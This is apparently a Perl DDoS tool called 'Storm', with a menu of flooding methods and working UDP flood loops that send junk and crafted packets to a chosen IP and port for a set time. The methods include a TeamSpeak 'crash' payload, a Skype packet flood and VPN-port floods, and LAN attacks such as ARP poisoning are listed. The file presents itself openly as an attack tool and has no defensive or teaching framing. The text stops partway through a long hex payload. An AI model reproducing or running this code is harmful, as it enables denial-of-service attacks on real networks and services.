use Socket;
use strict;
use Win32::ShellQuote;
use IO::Socket::INET;
use LWP::Simple;
 
my ($stormversion,$stormweb,$npingdir,$ipweb);
$stormversion = "1.1";
$stormweb = 'https://storm-drugs.xyz/stormmenu/';
$npingdir = "C:/Program Files (x86)/Nmap/";
$ipweb = "http://ip.42.pl/raw";
 
 my ($ip,$time,$method) = @ARGV; 

 system("cls");
 
if ($ip eq "methods") {
print "
                                                _____ __                     
                                               / ___// /_____  _________ ___ 
                                               \__ \/ __/ __ \/ ___/ __ `__ \
                                              ___/ / /_/ /_/ / /  / / / / / /
                                             /____/\__/\____/_/  /_/ /_/ /_/
                        
                                                                     Military Network Power
                                                         
	############################################### UDP Based ###############################################
	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Random Payloads                                       Exploit Methods
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 u1 | JunkUDP                                          ux1 | Voxility Exploit
	 u2 | JunkUDP Fast                                     ux2 | Cisco Exploit
	 u3 | Fast UDP
	 u4 | Fragmented UDP
	 u5 | Fake UDP Port Scan
	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Crafted Payloads
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 u6 | Skype Bypass
	 u7 | TS3 Crash
	 u8 | VPN Bruteforce Protocol
	
	############################################### TCP Based ###############################################
	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Random Payloads
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 t1 | ZeroACK
	
	############################################## ICMP Based ###############################################
	
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	Random Payloads
	~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
	 i1 | Junk Echo
	 i2 | Junk Timestamp
	 i3 | Junk Information Request
	
	############################################### LAN ONLY ################################################
	
	 l1 | DHCP Starvation
	 l2 | MAC Flood                         *SWITCHES*
	 l3 | ICMP Smurf
	 l4 | ARP Poisoning
";
exit(1);
}
elsif ($ip eq "check") {


#my $actualversion = get($stormweb . "v");

#if ($stormversion eq $actualversion) {
#print "[ INFO  ] storm Menu Version -> v" . $stormversion . " [Using the latest version]\n";
#}
#elsif ($actualversion eq "") {
#print "[ ALERT ] storm Menu Version -> v" . $stormversion . " [Can not connect to servers]\n";
#}
#else
#{
#print "[ ALERT ] storm Menu Version -> v" . $stormversion . " [Using an outdated version (Last is " . $actualversion . ")]\n";
#}
#sleep(1);
if (-d $npingdir) {
    print "[ INFO  ] NPING path found (NPING based methods will work fine)\n";
} else {
    print "[ ALERT ] NPING path was not found (NPING based methods will not work)\n";
}

my $myip = get($ipweb);
print "Public IP Found -> " . $myip;

exit(1);
}

elsif ($ip eq "changelog") {



my $changelogs = get($stormweb . "changelogs");


if ($changelogs eq "") {
print "[ ALERT ] Can not connect to servers\n";
}
else {
print $changelogs . "\n";
}

exit(1);
}

else {
system("cls");
	if ($#ARGV != 2) {

print "                                                           


                                                _____ __                     
                                               / ___// /_____  _________ ___ 
                                               \__ \/ __/ __ \/ ___/ __ `__ \
                                              ___/ / /_/ /_/ / /  / / / / / /
                                             /____/\__/\____/_/  /_/ /_/ /_/ 
                                
                        
                                                                        Military Network Power
                                                                                         

                                  perl storm.pl <IP> <TIME> <METHOD>
                                  perl storm.pl <OPTION>
								  
								  
                                  check     - Check Storm Menu (Update and Modules)
                                  methods   - Show the list of available methods
                                  changelog - Show changelogs
								  
								  
								  
								  
								  
								  
								  
								  
								  
								 
";
exit(1);
}
}
 

 
my ($iaddr,$hex2,$endtime,$socketdhcp,$psize,$port,$socket,$ltoken,$rtoken,$localport,$otherport,$fakescanport,$L2TPsocket,$l2tpudpport,$openvpnudpport,$sslvpnudpport,$size,$packets,$pps,$homeports,$randomhomeports,$hexed,$hexed1,$hexed2,$hexed3,$hexed4,$hexed5,$hexed6,$hexed7,$hexed8,$hexed9,$randomletter,$randomletter1,$randomletter2,$randomletter3,$randomletter4,$randomletter5,$randomletter6,$randomletter7,$randomletter8,$randomletter9,$randomletter10,$randomletter11);
 
my @hex = ("\x00","\x01","\x02","\x03","\x04","\x05","\x06","\x07","\x08","\x09","\x0a","\x0b","\x0c","\x0d","\x0e","\x0f","\x10","\x11","\x12","\x13","\x14","\x15","\x16","\x17","\x18","\x19","\x1a","\x1b","\x1c","\x1d","\x1e","\x1f","\x20","\x21","\x22","\x23","\x24","\x25","\x26","\x27","\x28","\x29","\x2a","\x2b","\x2c","\x2d","\x2e","\x2f","\x30","\x31","\x32","\x33","\x34","\x35","\x36","\x37","\x38","\x39","\x3a","\x3b","\x3c","\x3d","\x3e","\x3f","\x40","\x41","\x42","\x43","\x44","\x45","\x46","\x47","\x48","\x49","\x4a","\x4b","\x4c","\x4d","\x4e","\x4f","\x50","\x51","\x52","\x53","\x54","\x55","\x56","\x57","\x58","\x59","\x5a","\x5b","\x5c","\x5d","\x5e","\x5f","\x60","\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a","\x7b","\x7c","\x7d","\x7e","\x7f","\x80","\x81","\x82","\x83","\x84","\x85","\x86","\x87","\x88","\x89","\x8a","\x8b","\x8c","\x8d","\x8e","\x8f","\x90","\x91","\x92","\x93","\x94","\x95","\x96","\x97","\x98","\x99","\x9a","\x9b","\x9c","\x9d","\x9e","\x9f","\xa0","\xa1","\xa2","\xa3","\xa4","\xa5","\xa6","\xa7","\xa8","\xa9","\xaa","\xab","\xac","\xad","\xae","\xaf","\xb0","\xb1","\xb2","\xb3","\xb4","\xb5","\xb6","\xb7","\xb8","\xb9","\xba","\xbb","\xbc","\xbd","\xbe","\xbf","\xc0","\xc1","\xc2","\xc3","\xc4","\xc5","\xc6","\xc7","\xc8","\xc9","\xca","\xcb","\xcc","\xcd","\xce","\xcf","\xd0","\xd1","\xd2","\xd3","\xd4","\xd5","\xd6","\xd7","\xd8","\xd9","\xda","\xdb","\xdc","\xdd","\xde","\xdf","\xe0","\xe1","\xe2","\xe3","\xe4","\xe5","\xe6","\xe7","\xe8","\xe9","\xea","\xeb","\xec","\xed","\xee","\xef","\xf0","\xf1","\xf2","\xf3","\xf4","\xf5","\xf6","\xf7","\xf8","\xf9","\xfa","\xfb","\xfc","\xfd","\xfe","\xff");
my @hex2 = ("00","01","02","03","04","05","06","07","08","09","0a","0b","0c","0d","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0","f1","f2","f3","f4","f5","f6","f7","f8","f9","fa","fb","fc","fd","fe","ff");
#my @hex3 = ("96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7");
my @hex3 = ("02","03","04","05","06","07","08","09","0a","0b","0c","0d","0e","0f","10","11","12","13","14","15","16","17","18","19","1a","1b","1c","1d","1e","1f","20","21","22","23","24","25","26","27","28","29","2a","2b","2c","2d","2e","2f","30","31","32","33","34","35","36","37","38","39","3a","3b","3c","3d","3e","3f","40","41","42","43","44","45","46","47","48","49","4a","4b","4c","4d","4e","4f","50","51","52","53","54","55","56","57","58","59","5a","5b","5c","5d","5e","5f","60","61","62","63","64","65","66","67","68","69","6a","6b","6c","6d","6e","6f","70","71","72","73","74","75","76","77","78","79","7a","7b","7c","7d","7e","7f","80","81","82","83","84","85","86","87","88","89","8a","8b","8c","8d","8e","8f","90","91","92","93","94","95","96","97","98","99","9a","9b","9c","9d","9e","9f","a0","a1","a2","a3","a4","a5","a6","a7","a8","a9","aa","ab","ac","ad","ae","af","b0","b1","b2","b3","b4","b5","b6","b7","b8","b9","ba","bb","bc","bd","be","bf","c0","c1","c2","c3","c4","c5","c6","c7","c8","c9","ca","cb","cc","cd","ce","cf","d0","d1","d2","d3","d4","d5","d6","d7","d8","d9","da","db","dc","dd","de","df","e0","e1","e2","e3","e4","e5","e6","e7","e8","e9","ea","eb","ec","ed","ee","ef","f0");

my @letters = ("\x61","\x62","\x63","\x64","\x65","\x66","\x67","\x68","\x69","\x6a","\x6b","\x6c","\x6d","\x6e","\x6f","\x70","\x71","\x72","\x73","\x74","\x75","\x76","\x77","\x78","\x79","\x7a");

my @homeports = ("53","67","69","500","5060");

 
 
$iaddr = inet_aton("$ip") or die "Error\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

$packets = 0;


if($method eq "u1") {
print "[+] Port: ";
chop ($port = <stdin>);
print "[*] Using JunkUDP\n";
for (;time() <= $endtime;) {
  $psize = int(rand(1024-64)+126) ;
  $packets = $packets + 1;
   
  send(flood, pack("a$psize","$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize"), 0, pack_sockaddr_in($port, $iaddr));
print "Packets send -> " . $packets . "\r";

  } 
}
elsif($method eq "u2") {
print "[+] Port: ";
chop ($port = <stdin>);
print "[*] Using JunkUDP [More PPS]\n";
for (;time() <= $endtime;) {
  $psize = int(rand(1024-64)+126) ;

   
  send(flood, pack("a$psize","$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize"), 0, pack_sockaddr_in($port, $iaddr));

  } 
}





elsif($method eq "u3") {
print "[+] Port: ";
chop ($port = <stdin>);
print "[*] Using Fast UDP - Best for PPS\n";
for (;time() <= $endtime;) {
  $psize = int(rand(9)) ;
   
  send(flood, "", 0, pack_sockaddr_in($port, $iaddr));
  } 
}




elsif($method eq "u4") {
print "[+] Port: ";
chop ($port = <stdin>);
print "[*] Using FragmentedUDP\n";
for (;time() <= $endtime;) {
  $psize = int(rand(65535-64)+64) ;
	$packets = $packets + 1;
   
  send(flood, pack("a$psize","$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize$psize"), 0, pack_sockaddr_in($port, $iaddr));
print "Packets send -> " . $packets . "\r";
  } 
}

elsif($method eq "u5") {
print "[*] Using Fake UDP Port Scan\n";
$otherport = rand(65535);
for (;time() <= $endtime;) {
  
   $fakescanport = int(rand(100));

	if($fakescanport == "1"){
		send(flood, "\x0d\x0a\x0d\x0a", 0, pack_sockaddr_in("7", $iaddr));
	}
	elsif($fakescanport == "2"){
		send(flood, "\x00\x00\x10\x00\x00\x00\x00\x00\x00\x00\x00\x00", 0, pack_sockaddr_in("53", $iaddr));
	}
	elsif($fakescanport == "3"){
		send(flood, "\x0d\x31\x32\x33\x34\x35\x36\x37\x38\x51\x39\x39\x39\x00", 0, pack_sockaddr_in("80", $iaddr));
	}
	elsif($fakescanport == "4"){
		send(flood, "\x00\x01\x00\x02\x00\x01\x00", 0, pack_sockaddr_in("177", $iaddr));
	}
	elsif($fakescanport == "5") {
		send(flood, "\x30\x84\x00\x00\x00\x2d\x02\x01\x07\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x64\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x43\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00" , 0, pack_sockaddr_in("389", $iaddr));
	}
	elsif($fakescanport == "6"){
		send(flood, "\x02\x01\x00\x00\x36\x20\x00\x00\x00\x00\x00\x01\x00\x02\x65\x6e\x00\x00\x00\x15\x73\x65\x72\x76\x69\x63\x65\x3a\x73\x65\x72\x76\x69\x63\x65\x2d\x61\x67\x65\x6e\x74\x00\x07\x64\x65\x66\x61\x75\x6c\x74\x00\x00\x00\x00" , 0, pack_sockaddr_in("427", $iaddr)); 
	}
	elsif($fakescanport == "7"){
		send(flood, "\x16\xfe\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00\x36\x01\x00\x00\x2a\x00\x00\x00\x00\x00\x00\x00\x2a\xfe\xfd\x00\x00\x00\x00\x7c\x77\x40\x1e\x8a\xc8\x22\xa0\xa0\x18\xff\x93\x08\xca\xac\x0a\x64\x2f\xc9\x22\x64\xbc\x08\xa8\x16\x89\x19\x3f\x00\x00\x00\x02\x00\x2f\x01\x00", 0, pack_sockaddr_in("443", $iaddr));
	}
	elsif($fakescanport == "8"){
		send(flood, "\x00\x11\x22\x33\x44\x55\x66\x77\x00\x00\x00\x00\x00\x00\x00\x00\x01\x10\x02\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\xa4\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00\x98\x01\x01\x00\x04\x03\x00\x00\x24\x01\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x02\x01\x00\x00\x80\x01\x00\x05\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x00\x00\x01\x03\x00\x00\x24\x03\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x02\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x00\x00\x01\x00\x00\x00\x24\x04\x01\x00\x00\x80\x01\x00\x01\x80\x02\x00\x01\x80\x03\x00\x01\x80\x04\x00\x02\x80\x0b\x00\x01\x00\x0c\x00\x04\x00\x00\x00\x01", 0, pack_sockaddr_in("500", $iaddr));
	}
	elsif($fakescanport == "9"){
		send(flood, "\x00\x00", 0, pack_sockaddr_in("4500", $iaddr));
	}
	elsif($fakescanport == "10"){
		send(flood, "\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x09\x5f\x73\x65\x72\x76\x69\x63\x65\x73\x07\x5f\x64\x6e\x73\x2d\x73\x64\x04\x5f\x75\x64\x70\x05\x6c\x6f\x63\x61\x6c\x00\x00\x0c\x00\x01", 0, pack_sockaddr_in("5353", $iaddr));
	}
	elsif($fakescanport == "11"){
		send(flood, "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x55\x55\x55\x55\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xff\xff\x55\x13\x00\x00\x00\x30\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x00", 0, pack_sockaddr_in("17185", $iaddr));
	}
	else {
		send(flood, "", 0, pack_sockaddr_in($otherport, $iaddr));
	}
  
  


  } 
}




elsif($method eq "u6") {



print "[+] Local Port: ";
chop ($localport = <stdin>);
print "[+] Remote Port: ";
chop ($port = <stdin>);
print "[+] Token 1: ";
chop ($ltoken = <stdin>);
print "[+] Token 2: ";
chop ($rtoken = <stdin>);

$socket = new IO::Socket::INET (
PeerHost => $ip,
PeerPort => $port,
LocalPort => $localport,
Proto => 'udp');

print "[*] Using Skype Bypass\n";
for (;time() <= $endtime;) {
  $packets = $packets + 1;
   
 $socket->send("\x00\x01\x00\x4c\x21\x12\xa4\x42\x5c\x48\xd8\x5f\x94\x43\x3d\x6c\xfc\xa5\x8f\x4e\x00\x06\x00\x09" . $rtoken . "\x3a" . $ltoken . "\x00\x00\x00\x80\x2a\x00\x08\x00\x00\x00\x00\x05\x26\xd5\xc3\x80\x70\x00\x04\x00\x00\x00\x05\x00\x24\x00\x04\x6e\xff\xfd\xfe\x00\x08\x00\x14\x04\x64\x05\x81\xaf\xf4\xcc\x21\x72\x76\xf6\x94\x3c\x82\x98\xac\x53\xf7\xa6\x2d\x80\x28\x00\x04\xaf\x41\x0c\xcc");
 print "Packets send -> " . $packets . "\r";

  } 
}


elsif($method eq "u7") {
print "[+] Port: ";
chop ($port = <stdin>);
print "[*] Using TS3 Crash\n";
for (;time() <= $endtime;) {
  $psize = int(rand(1024-64)+126) ;
  #$packets = $packets + 2;
   
  $hexed = $hex[rand @hex];
  $hexed1 = $hex[rand @hex];
  $hexed2 = $hex[rand @hex];
  $hexed3 = $hex[rand @hex];
  $hexed4 = $hex[rand @hex];
  $hexed5 = $hex[rand @hex];
   
  send(flood, "\x54\x53\x33\x49\x4e\x49\x54\x31\x00\x65\x00\x00\x88\x09\x4e\xe2\xf3\x00\x5a\xdb" . $hexed . $hexed1 . $hexed2 . $hexed3 . $hexed4 . $hexed5 . "\x00\x00\x00\x00\x00\x00\x00\x00", 0, pack_sockaddr_in($port, $iaddr));
  send(flood,  $hexed . $hexed1 . $hexed2 . $hexed3 . $hexed4 . $hexed5 . $hexed . "\x00\x00\x00\x00\x22\x9d\x74\x8b\x45\xaa\x7b\xef\xb9\x9e\xfe\xad\x08\x19\xba\xcf\x41\xe0\x16\xa2\x1c\x5d\xfd\xcd\xd0\x87\x10\x60\xd2\x8f\xd1\x22\x00\x59\x90\x95\x23\x3e\x00\x97\x2b\x1c\x71\xb2\x4e\xc4\x61\xf1\xd7\x6f\xc5\x7e\xf6\x48\x52\xbf\x82\x6e\x8e\x58\x76\x8b\x2c\x77\x66\x35\xc4\x9e\x3c\xed\x69\xe7\xf2\x1e\xa7\xfa\x5a\xb8\x9f\x03\x2e\xfe\x84\x1a\x2d\x46\x4c\xae\x72\x42\xc2\x97\x2a\x07\xaf\xd1\x2c\xc9\x67\x92\xcc\xc7\x21\xf6\x3e\x99\x74\x6f\x74\x37\xad\x89\xa0\x33\x0a\x07\x2a\x1a\x9d\x27\x95\xd4\xe9\x25\xa0\x88\x46\xe2\xdf\xca\x58\x4f\x9b\x21\x62\x96\xd1\x06\x2d\xeb\xf3\xb8\xcc\x8a\xb8\xb6\x79\x0a\xeb\xa9\xd4\x25\xcf\x11\x84\x18\x90\xf5\xe7\xe6\x47\x39\xa3\x28\x85\x2e\x63\x47\x8c\x93\x8d", 0, pack_sockaddr_in($port, $iaddr));
  #print "Packets send -> " . $packets . "\r";

  } 
}




elsif($method eq "u8") {







print "[i] Enter 0 to not use a protocol\n";
print "[+] OpenVPN UDP Port: ";
chop ($openvpnudpport = <stdin>);
print "[+] SSL-VPN UDP Port: ";
chop ($sslvpnudpport = <stdin>);
print "[?] Use L2TP/IPSec UDP [Y/N]: ";
chop ($l2tpudpport = <stdin>);
print "\n[*] Using VPN Bruteforce Protocol\n";
for (;time() <= $endtime;) {
  $psize = int(rand(1024-64)+126) ;
  #$packets = $packets + 2;
   
  $hexed = $hex[rand @hex];
  $hexed1 = $hex[rand @hex];
  $hexed2 = $hex[rand @hex];
  $hexed3 = $hex[rand @hex];
  $hexed4 = $hex[rand @hex];
  $hexed5 = $hex[rand @hex];
  if($openvpnudpport != "0") {
	# OpenVPN
	send(flood, "\x38\x9f\xa4\x1d\x5b\x30\xa3\xea\xee\x00\x00\x00\x00\x00", 0, pack_sockaddr_in($openvpnudpport, $iaddr));
  }
   
  if($sslvpnudpport != "0") {
	# SSL-VPN
	send(flood, "\x4f\x91\x2b\xcd\x45\x65\xbd\xa9\x96\x23\xe7\x47\x98\x47\x1c\xdb\xd6\x66\xd3\xe1\xfb\x4a\x1e\xaf\x78\xdf\xab\x09\x94\xf4\xd8\x12\xbb\x8c\x5a\x34\x50\x5f\x6d\x7f\xc0\x5f\xf7\x88\x19\x2a\xe6\x07\x44\xe1\xf3\x50\x37\x44\x07\xcb\x32\x77\x51\x6c\x5a\xfc\x2c\xde\x48\x98\x4e\x35\x60\x18\x43\x1e\x31\x55\xd4\xbc\x38\x1d\x88\xee\x15\x0c\x92\xc8\xd2\x66\xfb\x0b\xf1\xbf\x42\xf6\x02\x79\x05\xd4\xd2\xc9\x90\xe5\x24\x1f\x8d\x59\x31\x2a\x1a\xac\x72\x43\x36\xf9\x84\xfc\x29\x19\x80\x59\x12\x61\x0f\x87\x8d\xac\x2c\xf0\xb9\x27\xec\xb6\x33\xb1\x0f\x0a\xc9\xa4\xef\xcc\x20\x5e\x2a\x97\xfb\x76\x09\xb0\xd0\x1e\x63\xf0\x5b\xd1\x77\x5f\x35\xc0\xae\x2d\xae\x92\xfe\xbe\xd7\x43\x01\x3d\x41\x81\xbd\x89\xe4\x9f\xcc\xc9\xa0\xac\xf5\xea\x09\x1a\x57\x93\xb8\xdd\x78\xb2\xfd\x0d\xb7\xbd\xcd\x90\xa2\xf1\x59\x1d\x7c\xf0\x2a\x72\xf3\x2f\xbb\xde\x58\x7f\x99\xc6\xcb\x63\x7e\xff\x7f\x62\x92\x46\xb4\xea\x67\x4a\x1a\xf6\x4b\x61\x27\x52\xb1\xa4\xa0\x33\x27\x1c\xcd\x4b\x0f\x97\x66\xb1\xf6\x23\x48\x3b\x86\x70\x73\x40\x26\x59\x22\x68\x89\xd2\x57\x06\x55\xcd\x05\x35\x95\x87\xdf\xd2\x48\x5b\x9d\xd5\x7d\x6d\xca\x59\xde\x39\xdb\x40\x88\xc8\xb3\xae\x63\x97\xee\xfb\xe0\x4b\xe6\x0e\x21\x0b\x0e\x20\x75\xa7\x1b\x6a\x87\xe3\x35\xda\x6c\x4f\x73\x60\x8c\xd2\x18\x5f\x6b\x5d\xa2\x68\xf9\x28\x5e\xe1\xc4\x9e\x9c\xbc\x44\xa6\x81\x34\x58\xad\x52\x1e\x9c\x7c\x0f\x48\xb3\x4d\xc3\x22\x65\x57\x9b\x33\xa4\x6e\x58\x57\x15\x5a\x0e\x72\xee\xd9\x99\x15\x85\x37\xfe\xf0\x0f\x6b\x2d\x93\x49\xbf\x6c\xcc\x80\x18\x4e\xf8\xf2\x90\x79\x25\x90\xf7\x6b\xc4\x14\x42\x25\x85\xc8\x21\xcb\xa4\xbc\xd5\xf4\x1c\x20\x7f\xbe\xbc\x9e\x1d\x3e\xe3\xef\x4c\x19\xbc\x35\x41\x57\xe7\x48\xc4\x7d\x49\xe6\x7a\x29\x25\xcc\x75\x88\x58\xe0\xd3\xa8\x57\x83\x7e\x08\xa0\x43\xcb\xa0\x8b\xdd\xb7\xf5\x2e\x9d\xca\x11\xf9\x4e\x5c\xef\x8a\xb3\x88\x99\xc8\xa6\x49\x6d\x64\x84\x8a\x95\x95\xca\xbc\xdf\x60\x18\x6f\xd9\x57\x78\xb6\x8c\xbf\xd6\x14\x33\xf2\xa1\xab\xc0\x6d\xd2\x7b\x31\xb2\x4b\x27\x1d\x15\x44\xa5\x27\x43\xf2\xcf\x5c\xc1\x9a\x34\xa6\xa3\x1b\xfc\xf2\xbe\x99\x29\x5a\x0b\x83\x2d\x8b\x78\xaf\xa6\x60\x16\x1f\x32\x36\x00\xce\xfd\x8c\xfd\x96\x6e\xc9\xb3\xa7\x40\x29\xfc\xb0\xd5\xbe\x5a\x3c\xeb\xba\x84\x6d\x88\x6e\xb8\xef\x52\xd7\x58\xf4\x26\x53\x8c\xae\x26\x8d\xa1\x57\xad\xb7\x30\x59\xfd\xb4\x8b\xf1\xe2\xb2\x5d\xf9\x67\xd2\x75\x66\x01\xa8\xb4\x6f\x75\x45\x07\x0a\x40\x5e\xb6\xd3\x48\xd7\xd0\x66\x64\x56\xc0\x7b\x35\x00\x8f\x73\xf6\x20\x7b\x55\x32\x49\xa7\xfa\xe2\xd9\x47\x12\x91\x0a\x37\xb7\xa0\x6f\x35\xb2\x2f\x09\x24\x4b\x85\xbc\xb5\xd9\x9e\xd7\x29\xb2\xa8\xbc\x68\xab\xe8\xc3\x85\xd9\x51\xe0\x92\x39\x5a\xe8\xfe\xaf\x46\x7a\x6f\xc4\x7b\x3e\xd9\x47\x79\x78\x24\x4f\x5a\xc9\xcd\x8d\x19\xc1\xb8\x8b\x42\x17\x69\xed\x1